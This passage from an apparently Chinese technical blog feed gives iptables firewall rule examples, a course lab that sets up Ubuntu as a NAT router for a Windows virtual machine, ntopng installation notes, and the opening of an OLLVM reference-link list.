class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 4.丢弃从外网接口（eth1）进入防火墙本机的源地址为私网地址的数据包</span></span><br><span class="line">$ iptables -A INPUT -i eth1 -s 192.168.0.0/16 -j DROP</span><br><span class="line">$ iptables -A INPUT -i eth1 -s 172.16.0.0/12 -j DROP</span><br><span class="line">$ iptables -A INPUT -i eth1 -s 10.0.0.0/8 -j DROP</span><br><span class="line"></span><br><span class="line"><span class="comment"># 5.封堵网段（192.168.1.0/24），两小时后解封。</span></span><br><span class="line"><span class="comment"># 说明：这个策略咱们借助crond计划任务来完成，就再好不过了。</span></span><br><span class="line">$ iptables -I INPUT -s 10.20.30.0/24 -j DROP</span><br><span class="line">$ iptables -I FORWARD -s 10.20.30.0/24 -j DROP</span><br><span class="line">$ at now 2 hours at&gt; iptables -D INPUT 1 at&gt; iptables -D FORWARD 1</span><br><span class="line"></span><br><span class="line">[1]   Stopped     at now 2 hours</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 6.只允许管理员从202.13.0.0/16网段使用SSH远程登录防火墙主机。</span></span><br><span class="line"><span class="comment"># 说明：这个用法比较适合对设备进行远程管理时使用</span></span><br><span class="line"><span class="comment"># 比如位于分公司中的SQL服务器需要被总公司的管理员管理时。</span></span><br><span class="line">$ iptables -A INPUT -p tcp --dport 22 -s 202.13.0.0/16 -j ACCEPT</span><br><span class="line">$ iptables -A INPUT -p tcp --dport 22 -j DROP</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 7.允许本机开放从TCP端口20-1024提供的应用服务。</span></span><br><span class="line">$ iptables -A INPUT -p tcp --dport 20:1024 -j ACCEPT</span><br><span class="line">$ iptables -A OUTPUT -p tcp --sport 20:1024 -j ACCEPT</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 8.允许转发来自192.168.0.0/24局域网段的DNS解析请求数据包。</span></span><br><span class="line">$ iptables -A FORWARD -s 192.168.0.0/24 -p udp --dport 53 -j ACCEPT</span><br><span class="line">$ iptables -A FORWARD -d 192.168.0.0/24 -p udp --sport 53 -j ACCEPT</span><br><span class="line"></span><br><span class="line"><span class="comment"># 9.禁止其他主机ping防火墙主机，但是允许从防火墙上ping其他主机</span></span><br><span class="line">$ iptables -I INPUT -p icmp --icmp-type Echo-Request -j DROP</span><br><span class="line">$ iptables -I INPUT -p icmp --icmp-type Echo-Reply -j ACCEPT</span><br><span class="line">$ iptables -I INPUT -p icmp --icmp-type destination-Unreachable -j ACCEPT</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 10.禁止转发来自MAC地址为00：0C：29：27：55：3F的和主机的数据包</span></span><br><span class="line"><span class="comment"># 说明：iptables中使用“-m 模块关键字”的形式调用显示匹配。这里用“-m mac –mac-source”来表示数据包的源MAC地址。</span></span><br><span class="line">$ iptables -A FORWARD -m mac --mac-source 00:0c:29:27:55:3F -j DROP</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 11.允许防火墙本机对外开放TCP端口20、21、25、110以及被动模式FTP端口1250-1280</span></span><br><span class="line"><span class="comment"># 说明：这里用“-m multiport –dport”来指定目的端口及范围</span></span><br><span class="line">$ iptables -A INPUT -p tcp -m multiport --dport 20,21,25,110,1250:1280 -j ACCEPT</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 12.禁止转发源IP地址为192.168.1.20-192.168.1.99的TCP数据包。</span></span><br><span class="line"><span class="comment"># 说明：此处用“-m –iprange –src-range”指定IP范围。</span></span><br><span class="line">$ iptables -A FORWARD -p tcp -m iprange --src-range 192.168.1.20-192.168.1.99 -j DROP</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 13.禁止转发与正常TCP连接无关的非—syn请求数据包。</span></span><br><span class="line"><span class="comment"># 说明：“-m state”表示数据包的连接状态，“NEW”表示与任何连接无关的，新的嘛！</span></span><br><span class="line">$ iptables -A FORWARD -m state --state NEW -p tcp ! --syn -j DROP</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 14.拒绝访问防火墙的新数据包，但允许响应连接或与已有连接相关的数据包</span></span><br><span class="line"><span class="comment"># 说明：“ESTABLISHED”表示已经响应请求或者已经建立连接的数据包</span></span><br><span class="line"><span class="comment"># “RELATED”表示与已建立的连接有相关性的，比如FTP数据连接等。</span></span><br><span class="line">$ iptables -A INPUT -p tcp -m state --state NEW -j DROP</span><br><span class="line">$ iptables -A INPUT -p tcp -m state --state ESTABLISHED,RELATED -j ACCEPT</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 15.只开放本机的web服务（80）、FTP(20、21、20450-20480)，放行外部主机发住服务器其它端口的应答数据包，将其他入站数据包均予以丢弃处理。</span></span><br><span class="line">$ iptables -I INPUT -p tcp -m multiport --dport 20,21,80 -j ACCEPT</span><br><span class="line">$ iptables -I INPUT -p tcp --dport 20450:20480 -j ACCEPT</span><br><span class="line">$ iptables -I INPUT -p tcp -m state --state ESTABLISHED -j ACCEPT</span><br><span class="line">$ iptables -P INPUT DROP</span><br></pre></td></tr></table></figure><h4 id="常用iptables规则"><a href="#常用iptables规则" class="headerlink" title="常用iptables规则"></a>常用iptables规则</h4><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 1. 删除所有现有规则</span></span><br><span class="line">$ iptables -F</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 2. 设置默认的 chain 策略</span></span><br><span class="line">$ iptables -P INPUT DROP</span><br><span class="line">$ iptables -P FORWARD DROP</span><br><span class="line">$ iptables -P OUTPUT DROP</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 3. 阻止某个特定的 IP 地址</span></span><br><span class="line">$ BLOCK_THIS_IP=<span class="string">"x.x.x.x"</span></span><br><span class="line">$ iptables -A INPUT -s <span class="string">"<span class="variable">$BLOCK_THIS_IP</span>"</span> -j DROP</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 4. 允许全部进来的（incoming）SSH</span></span><br><span class="line">$ iptables -A INPUT -i eth0 -p tcp --dport 22 -m state --state NEW,ESTABLISHED -j ACCEPT</span><br><span class="line">$ iptables -A OUTPUT -o eth0 -p tcp --sport 22 -m state --state ESTABLISHED -j ACCEPT</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 5. 只允许某个特定网络进来的 SSH</span></span><br><span class="line">$ iptables -A INPUT -i eth0 -p tcp -s 192.168.200.0/24 --dport 22 -m state --state NEW,ESTABLISHED -j ACCEPT</span><br><span class="line">$ iptables -A OUTPUT -o eth0 -p tcp --sport 22 -m state --state ESTABLISHED -j ACCEPT</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 6. 允许进来的（incoming）HTTP</span></span><br><span class="line">$ iptables -A INPUT -i eth0 -p tcp --dport 80 -m state --state NEW,ESTABLISHED -j ACCEPT</span><br><span class="line">$ iptables -A OUTPUT -o eth0 -p tcp --sport 80 -m state --state ESTABLISHED -j ACCEPT</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 7. 多端口（允许进来的 SSH、HTTP 和 HTTPS）</span></span><br><span class="line">$ iptables -A INPUT -i eth0 -p tcp -m multiport --dports 22,80,443 -m state --state NEW,ESTABLISHED -j ACCEPT</span><br><span class="line">$ iptables -A OUTPUT -o eth0 -p tcp -m multiport --sports 22,80,443 -m state --state ESTABLISHED -j ACCEPT</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 8. 允许出去的（outgoing）SSH</span></span><br><span class="line">$ iptables -A OUTPUT -o eth0 -p tcp --dport 22 -m state --state NEW,ESTABLISHED -j ACCEPT</span><br><span class="line">$ iptables -A INPUT -i eth0 -p tcp --sport 22 -m state --state ESTABLISHED -j ACCEPT</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 9. 允许外出的（outgoing）SSH，但仅访问某个特定的网络</span></span><br><span class="line">$ iptables -A OUTPUT -o eth0 -p tcp -d 192.168.101.0/24 --dport 22 -m state --state NEW,ESTABLISHED -j ACCEPT</span><br><span class="line">$ iptables -A INPUT -i eth0 -p tcp --sport 22 -m state --state ESTABLISHED -j ACCEPT</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 10. 允许外出的（outgoing） HTTPS</span></span><br><span class="line">$ iptables -A OUTPUT -o eth0 -p tcp --dport 443 -m state --state NEW,ESTABLISHED -j ACCEPT</span><br><span class="line">$ iptables -A INPUT -i eth0 -p tcp --sport 443 -m state --state ESTABLISHED -j ACCEPT</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 11. 对进来的 HTTPS 流量做负载均衡</span></span><br><span class="line">$ iptables -A PREROUTING -i eth0 -p tcp --dport 443 -m state --state NEW -m nth --counter 0 --every 3 --packet 0 -j DNAT --to-destination 192.168.1.101:443</span><br><span class="line">$ iptables -A PREROUTING -i eth0 -p tcp --dport 443 -m state --state NEW -m nth --counter 0 --every 3 --packet 1 -j DNAT --to-destination 192.168.1.102:443</span><br><span class="line">$ iptables -A PREROUTING -i eth0 -p tcp --dport 443 -m state --state NEW -m nth --counter 0 --every 3 --packet 2 -j DNAT --to-destination 192.168.1.103:443</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 12. 从内部向外部 Ping</span></span><br><span class="line">$ iptables -A OUTPUT -p icmp --icmp-type <span class="built_in">echo</span>-request -j ACCEPT</span><br><span class="line">$ iptables -A INPUT -p icmp --icmp-type <span class="built_in">echo</span>-reply -j ACCEPT</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 13. 从外部向内部 Ping</span></span><br><span class="line">$ iptables -A INPUT -p icmp --icmp-type <span class="built_in">echo</span>-request -j ACCEPT</span><br><span class="line">$ iptables -A OUTPUT -p icmp --icmp-type <span class="built_in">echo</span>-reply -j ACCEPT</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 14. 允许环回（loopback）访问</span></span><br><span class="line">$ iptables -A INPUT -i lo -j ACCEPT</span><br><span class="line">$ iptables -A OUTPUT -o lo -j ACCEPT</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 15. 允许 packets 从内网访问外网</span></span><br><span class="line"><span class="comment"># if eth1 is connected to external network (internet)</span></span><br><span class="line"><span class="comment"># if eth0 is connected to internal network (192.168.1.x)</span></span><br><span class="line">$ iptables -A FORWARD -i eth0 -o eth1 -j ACCEPT</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 16. 允许外出的  DNS</span></span><br><span class="line">$ iptables -A OUTPUT -p udp -o eth0 --dport 53 -j ACCEPT</span><br><span class="line">$ iptables -A INPUT -p udp -i eth0 --sport 53 -j ACCEPT</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 17. 允许 NIS 连接</span></span><br><span class="line">$ rpcinfo -p | grep ypbind ; This port is 853 and 850</span><br><span class="line">$ iptables -A INPUT -p tcp --dport 111 -j ACCEPT</span><br><span class="line">$ iptables -A INPUT -p udp --dport 111 -j ACCEPT</span><br><span class="line">$ iptables -A INPUT -p tcp --dport 853 -j ACCEPT</span><br><span class="line">$ iptables -A INPUT -p udp --dport 853 -j ACCEPT</span><br><span class="line">$ iptables -A INPUT -p tcp --dport 850 -j ACCEPT</span><br><span class="line">$ iptables -A INPUT -p udp --dport 850 -j ACCEPT</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 18. 允许某个特定网络 rsync 进入本机</span></span><br><span class="line">$ iptables -A INPUT -i eth0 -p tcp -s 192.168.101.0/24 --dport 873 -m state --state NEW,ESTABLISHED -j ACCEPT</span><br><span class="line">$ iptables -A OUTPUT -o eth0 -p tcp --sport 873 -m state --state ESTABLISHED -j ACCEPT</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 19. 仅允许来自某个特定网络的 MySQL 的链接</span></span><br><span class="line">$ iptables -A INPUT -i eth0 -p tcp -s 192.168.200.0/24 --dport 3306 -m state --state NEW,ESTABLISHED -j ACCEPT</span><br><span class="line">$ iptables -A OUTPUT -o eth0 -p tcp --sport 3306 -m state --state ESTABLISHED -j ACCEPT</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 20. 允许 Sendmail 或 Postfix</span></span><br><span class="line">$ iptables -A INPUT -i eth0 -p tcp --dport 25 -m state --state NEW,ESTABLISHED -j ACCEPT</span><br><span class="line">$ iptables -A OUTPUT -o eth0 -p tcp --sport 25 -m state --state ESTABLISHED -j ACCEPT</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 21. 允许 IMAP 和 IMAPS</span></span><br><span class="line">$ iptables -A INPUT -i eth0 -p tcp --dport 143 -m state --state NEW,ESTABLISHED -j ACCEPT</span><br><span class="line">$ iptables -A OUTPUT -o eth0 -p tcp --sport 143 -m state --state ESTABLISHED -j ACCEPT</span><br><span class="line">$ iptables -A INPUT -i eth0 -p tcp --dport 993 -m state --state NEW,ESTABLISHED -j ACCEPT</span><br><span class="line">$ iptables -A OUTPUT -o eth0 -p tcp --sport 993 -m state --state ESTABLISHED -j ACCEPT</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 22. 允许 POP3 和 POP3S</span></span><br><span class="line">$ iptables -A INPUT -i eth0 -p tcp --dport 110 -m state --state NEW,ESTABLISHED -j ACCEPT</span><br><span class="line">$ iptables -A OUTPUT -o eth0 -p tcp --sport 110 -m state --state ESTABLISHED -j ACCEPT</span><br><span class="line">$ iptables -A INPUT -i eth0 -p tcp --dport 995 -m state --state NEW,ESTABLISHED -j ACCEPT</span><br><span class="line">$ iptables -A OUTPUT -o eth0 -p tcp --sport 995 -m state --state ESTABLISHED -j ACCEPT</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 23. 防止 DoS 攻击</span></span><br><span class="line">$ iptables -A INPUT -p tcp --dport 80 -m <span class="built_in">limit</span> --<span class="built_in">limit</span> 25/minute --<span class="built_in">limit</span>-burst 100 -j ACCEPT</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 24. 设置 422 端口转发到 22 端口</span></span><br><span class="line">$ iptables -t nat -A PREROUTING -p tcp -d 192.168.102.37 --dport 422 -j DNAT --to 192.168.102.37:22</span><br><span class="line">$ iptables -A INPUT -i eth0 -p tcp --dport 422 -m state --state NEW,ESTABLISHED -j ACCEPT</span><br><span class="line">$ iptables -A OUTPUT -o eth0 -p tcp --sport 422 -m state --state ESTABLISHED -j ACCEPT</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 25. 为丢弃的包做日志（Log）</span></span><br><span class="line">$ iptables -N LOGGING</span><br><span class="line">$ iptables -A INPUT -j LOGGING</span><br><span class="line">$ iptables -A LOGGING -m <span class="built_in">limit</span> --<span class="built_in">limit</span> 2/min -j LOG --<span class="built_in">log</span>-prefix <span class="string">"IPTables Packet Dropped: "</span> --<span class="built_in">log</span>-level 7</span><br><span class="line">$ iptables -A LOGGING -j DROP</span><br></pre></td></tr></table></figure><h3 id="iptables防火墙规则的保存与恢复"><a href="#iptables防火墙规则的保存与恢复" class="headerlink" title="iptables防火墙规则的保存与恢复"></a>iptables防火墙规则的保存与恢复</h3><p><code>iptables-save</code>把规则保存到文件中，再由目录<code>rc.d</code>下的脚本（<code>/etc/rc.d/init.d/iptables</code>）自动装载，使用命令<code>iptables-save</code>来保存规则。</p><p>一般用<code>iptables-save &gt; /etc/sysconfig/iptables</code> 生成保存规则的文件<code>/etc/sysconfig/iptables</code>，也可以用<code>service iptables save</code>它能把规则自动保存在<code>/etc/sysconfig/iptables</code>中。</p><p>当计算机启动时，rc.d下的脚本将用命令iptables-restore调用这个文件，从而就自动恢复了规则。</p><h3 id="iptables的简单应用"><a href="#iptables的简单应用" class="headerlink" title="iptables的简单应用"></a>iptables的简单应用</h3><p>由于网络安全课程的实验，特地来学习iptables，可以把实验当作一个应用示例</p><p>实验大致如下：</p><ul><li>一台windows虚拟机，内网环境，无法直接访问外网</li><li>一台linux虚拟机，两个网卡，一个用于连接外网，一个用于连接内网(即windows虚拟机)</li><li>目标：利用iptables将linux配置成路由器，windows虚拟机通过路由器访问Internet</li></ul><p>实验环境：Ubuntu 18.04和windows server2016</p><p>刚开始认为创建网卡，便在虚拟机的ubuntu里创建了一个虚拟网卡，后面才发现不对，构建不了内网环境，之后才发现是在vmware中添加物理网卡(模拟的)构建内网环境。</p><p>所以首先为ubuntu创建两个网卡，一个能访问外网(使用NAT)，另外一个仅内网(vmware里的仅主机，LAN那个我没搞懂，应该也是可以的)</p><p>在linux中，用命令<code>sudo vim /etc/network/interfaces</code>修改网卡配置如下：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># interfaces(5) file used by ifup(8) and if down(8)</span></span><br><span class="line">auto lo</span><br><span class="line">iface lo inet loopback</span><br><span class="line"></span><br><span class="line">auto ens33</span><br><span class="line">iface ens33 inet static</span><br><span class="line">address 192.168.52.128</span><br><span class="line">netmask 255.255.255.0</span><br><span class="line">gateway 192.168.52.1</span><br><span class="line"></span><br><span class="line">auto ens38</span><br><span class="line">iface ens38 inet static</span><br><span class="line">address 172.16.0.10</span><br><span class="line">netmask 255.255.255.0</span><br></pre></td></tr></table></figure><p>修改后，重启网络配置</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sc@sc-virtual-machine:~$ sudo /etc/init.d/networking restart</span><br><span class="line">[ ok ] Restarting networking (via systemctl): networking.service.</span><br><span class="line">sc@sc-virtual-machine:~$</span><br></pre></td></tr></table></figure><p>还有一点，要开启linux的ip转发功能，命令如下：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">root@sc-virtual-machine:/home/sc<span class="comment"># echo 1 &gt; /proc/sys/net/ipv4/ip_forward</span></span><br><span class="line">$ sudo vim  /etc/sysctl.conf</span><br><span class="line"><span class="comment"># net.ipv4.ip_forward = 1</span></span><br><span class="line"><span class="comment"># 取消上面这个注释,开启linux转发</span></span><br><span class="line">sc@sc-virtual-machine:~$ sudo sysctl -p</span><br></pre></td></tr></table></figure><p>在<code>sysctl.conf</code>里，本来就有注释的转发配置语句，取消注释即可，用命令重新加载内核参数，当然，此时重启linux虚拟机也不是不可以</p><p>在windows做如下配置</p><p>控制面板-&gt;网络和Internet-&gt;网络和共享中心-&gt;本地连接-&gt;属性-&gt;Internet协议版本4（TCP/IPv4）-&gt;属性</p><p><img src="https://magic-king.net/images/loading.gif" data-original="iptables/5.png" alt></p><p>特别地，要将windows网关配置为linux的内网网卡地址</p><p>然后要记得，DNS服务器要和linux主机的一致</p><p>假如，windows虚拟机能ping通linux主机，但是linux主机ping不通windows，则需要关闭windows的防火墙，或者在windows防火墙中，在入站规则内打开ICMP回显</p><p>控制面板-&gt;系统和安全-&gt;Windows防火墙-&gt;高级设置-&gt;入站规则-&gt;文件和打印机共享（回显请求-ICMPv4-In）-&gt;右键-&gt;启用规则</p><h5 id="iptables转发"><a href="#iptables转发" class="headerlink" title="iptables转发"></a>iptables转发</h5><p>用iptables做nat，命令如下</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sc@sc-virtual-machine:~$ <span class="comment"># sudo iptables -t nat -A POSTROUTING  -o ens33 -j MASQUERADE</span></span><br><span class="line">sc@sc-virtual-machine:~$ sudo iptables -t nat -A POSTROUTING -s 172.16.0.0/24 -o ens33 -j MASQUERADE</span><br><span class="line">sc@sc-virtual-machine:~$ sudo iptables -A FORWARD -i ens38 -j ACCEPT</span><br></pre></td></tr></table></figure><p>将来自<code>172.16.0.0/24</code>内网的流量转发到ens33，<code>MASQUERADE</code>是指用该网卡上的IP来替换源地址IP，对于IP不固定，如dhcp自动分配ip的情况下使用，这边由于是静态ip，不加该选项也是可以的</p><p>运行完命令后，在windows主机就可以ping通<code>baidu.com</code>了，实验就完成了</p>]]></content>
      
      
      <categories>
          
          <category> linux </category>
          
          <category> Network </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux </tag>
            
            <tag> security </tag>
            
            <tag> network </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Ntop</title>
      <link href="/2020/03/06/Ntop/"/>
      <url>/2020/03/06/Ntop/</url>
      
        <content type="html"><![CDATA[<h1 id="Ntop"><a href="#Ntop" class="headerlink" title="Ntop"></a>Ntop</h1><blockquote><p>参考：</p><p><a href="https://github.com/ntop" target="_blank" rel="noopener">Github-ntop</a></p><p><a href="https://github.com/ntop/ntopng" target="_blank" rel="noopener">Github-ntop/ntopng</a></p><p><a href="https://www.ntop.org/products/traffic-analysis/ntop/" target="_blank" rel="noopener">Ntopng</a></p><p><a href="https://www.ntop.org/guides/ntopng/" target="_blank" rel="noopener">Ntopng-userguide</a></p><p><a href="https://www.jianshu.com/p/ef2252dbc176" target="_blank" rel="noopener">运用Ntop监控网络流量</a></p></blockquote><p>Ntop是一种监控网络流量的工具，而Ntopng是基于web的高速流量分析和流收集工具，是ntop的下一代，ntopng基于libpcap，并且以可移植的方式编写</p><blockquote><p>Ntop的功能：</p><ul><li>自动从网络中识别有用的信息；</li><li>将截获的数据包转换成易于识别的格式；</li><li>对网络环境中通信失败的情况进行分析；</li><li>探测网络环境中的通信瓶颈,记录网络通信的时间和过程。</li></ul></blockquote><h3 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h3><p>我在ubuntu18.04上装ntopng，linux就是这么简单，一行命令解决</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo apt-get install ntopng</span><br></pre></td></tr></table></figure><p><img src="https://magic-king.net/images/loading.gif" data-original="Ntop/1.png" alt></p><p>运行示例如下，运行后访问 <a href="http://localhost:3000" target="_blank" rel="noopener">http://localhost:3000</a></p><p>进入后要先注册，默认admin/admin，强制改密码，需要5位数，我改成了admin/12345</p><p>以下是所有主机</p><p><img src="https://magic-king.net/images/loading.gif" data-original="Ntop/2.png" alt></p><p>这是其主页，ens33是桥接外网的网卡</p><p><img src="https://magic-king.net/images/loading.gif" data-original="Ntop/3.png" alt></p><p>流量监控如下</p><p><img src="https://magic-king.net/images/loading.gif" data-original="Ntop/4.png" alt></p><p>针对某个流量的监控：我主机和虚拟机相互ping</p><p><img src="https://magic-king.net/images/loading.gif" data-original="Ntop/5.png" alt></p>]]></content>
      
      
      <categories>
          
          <category> Network </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Network </tag>
            
            <tag> Ntop </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ollvm-learning</title>
      <link href="/2020/02/27/ollvm-learning/"/>
      <url>/2020/02/27/ollvm-learning/</url>
      
        <content type="html"><![CDATA[<h1 id="llvm"><a href="#llvm" class="headerlink" title="llvm"></a>llvm</h1><blockquote><p>参考：</p><p><a href="http://llvm.org/" target="_blank" rel="noopener">LLVM官网</a></p><p><a href="http://llvm.org/docs/" target="_blank" rel="noopener">LLVM-docs</a> ：注意要查看对应版本的文档，每个版本文档都有所改变</p><p><a href="https://github.com/llvm/llvm-project/" target="_blank" rel="noopener">Github-llvm/llvm-project</a></p><p><a href="https://github.com/llvm-mirror/llvm" target="_blank" rel="noopener">Github-llvm-mirror/llvm</a></p><p><a href="https://www.jianshu.com/p/707c4f8af150" target="_blank" rel="noopener">LLVM基础(IR简介&amp;CFG图生成&amp;可视化)</a>：可以生成可视化的IR流程图</p><p>参考的GitHub</p><p><a href="https://github.com/heroims/obfuscator" target="_blank" rel="noopener">Github-heroims/obfuscator</a> ：移植好的ollvm9.0等</p><p><a href="https://heroims.github.io/2019/01/06/OLLVM%E4%BB%A3%E7%A0%81%E6%B7%B7%E6%B7%86%E7%A7%BB%E6%A4%8D%E4%B8%8E%E4%BD%BF%E7%94%A8/" target="_blank" rel="noopener">OLLVM代码混淆移植与使用</a> ：heroims的博客</p><p><a href="https://github.com/iamywang/obfuscator" target="_blank" rel="noopener">Github-iamywang/obfuscator</a></p><p><a href="https://github.com/HikariObfuscator/Hikari" target="_blank" rel="noopener">Github-HikariObfuscator/Hikari</a></p><p><a href="https://github.com/GoSSIP-SJTU/Armariris" target="_blank" rel="noopener">Github-GoSSIP-SJTU/Armariris</a></p><p><a href="https://github.com/obfuscator-llvm/obfuscator" target="_blank" rel="noopener">Github-obfuscator-llvm/obfuscator</a> ：官方版本</p><p><a href="https://github.com/obfuscator-llvm/obfuscator/wiki" target="_blank" rel="noopener">obfuscator-wiki</a></p><p><a href="https://bbs.pediy.com/thread-225756.htm" target="_blank" rel="noopener">pediy.com—[原创]ollvm快速学习</a></p><p><a href="https://juejin.im/post/5bfba01df265da614273939a" target="_blank" rel="noopener">llvm入门</a></p><p><a href="https://heroims.github.io/2019/01/06/OLLVM%E4%BB%A3%E7%A0%81%E6%B7%B7%E6%B7%86%E7%A7%BB%E6%A4%8D%E4%B8%8E%E4%BD%BF%E7%94%A8/" target="_blank" rel="noopener">OLLVM代码混淆移植与使用</a></p><p><a href="https://www.leadroyal.cn/?p=659" target="_blank" rel="noopener">llvm学习（三）：移植ollvm等作品到单独编译的Pass</a></p><p><a href="https://zhuanlan.zhihu.com/frozengene" target="_blank" rel="noopener">蓝色的味道</a>：谁说不能与龙一起跳舞：Clang / LLVM</p><p><a href="https://www.jianshu.com/p/e0637f3169a3" target="_blank" rel="noopener">OLLVM代码混淆移植与使用</a></p><p><a href="https://zhuanlan.zhihu.com/llvm-tutorial" target="_blank" rel="noopener">llvm入门笔记</a></p><p><a href="https://www.jianshu.com/p/333cf1c02a0e" target="_blank" rel="noopener">llvm编译流程</a></p><p><a href="https://www.jianshu.com/p/942875aa73cc" target="_blank" rel="noopener">LLVM学习总结与OLLVM项目分析</a></p><p><a href="https://sq.163yun.com/blog/article/175307579596922880" target="_blank" rel="noopener">Obfuscator-llvm源码分析</a></p><p><a 